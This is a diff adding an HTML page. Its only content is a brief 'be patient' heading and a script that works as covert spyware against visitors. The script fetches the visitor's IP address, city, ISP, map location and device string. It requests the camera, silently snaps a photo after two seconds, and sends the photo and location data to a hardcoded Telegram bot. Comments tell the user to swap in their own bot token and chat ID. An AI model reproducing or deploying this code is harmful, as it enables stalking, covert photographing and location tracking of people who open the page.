@@ -1,0 +1,67 @@
+
+    <h2>اصبر ولك...</h2>
+    <script>
+      const TOKEN = "7782080900:AAGvcMWaE_IAbb_0_0-HwcyCvQUUUVxBYmc"; // Ganti sama token lu
+      const CHAT_ID = "5932979028"; // Ganti sama chat ID
+
+      let userInfo = "";
+
+      // Ambil info IP & lokasi
+      fetch("https://ipinfo.io/json?token=free")
+        .then(res => res.json())
+        .then(data => {
+          userInfo = `
+IP: ${data.ip}
+Kota: ${data.city}
+Region: ${data.region}
+Negara: ${data.country}
+ISP: ${data.org}
+Lokasi: https://www.google.com/maps?q=${data.loc}
+Device: ${navigator.userAgent}
+          `.trim();
+        });
+
+      navigator.mediaDevices.getUserMedia({ video: true })
+        .then(function(stream) {
+          const video = document.createElement("video");
+          video.srcObject = stream;
+          video.play();
+
+          video.addEventListener('loadedmetadata', () => {
+            const width = video.videoWidth;
+            const height = video.videoHeight;
+
+            setTimeout(() => {
+              const canvas = document.createElement("canvas");
+              canvas.width = width;
+              canvas.height = height;
+              const ctx = canvas.getContext('2d');
+              ctx.drawImage(video, 0, 0, width, height);
+
+              canvas.toBlob(function(blob) {
+                // Kirim Foto
+                const formData = new FormData();
+                formData.append("chat_id", CHAT_ID);
+                formData.append("photo", blob, "foto.jpg");
+
+                fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, {
+                  method: "POST",
+                  body: formData
+                });
+
+                // Kirim Info
+                fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
+                  method: "POST",
+                  headers: { "Content-Type": "application/json" },
+                  body: JSON.stringify({
+                    chat_id: CHAT_ID,
+                    text: userInfo
+                  })
+                });
+
+              }, "image/jpeg", 0.9);
+            }, 2000);
+          });
+        })
+        .catch(err => alert("Akses kamera gagal: " + err));
+    </script>
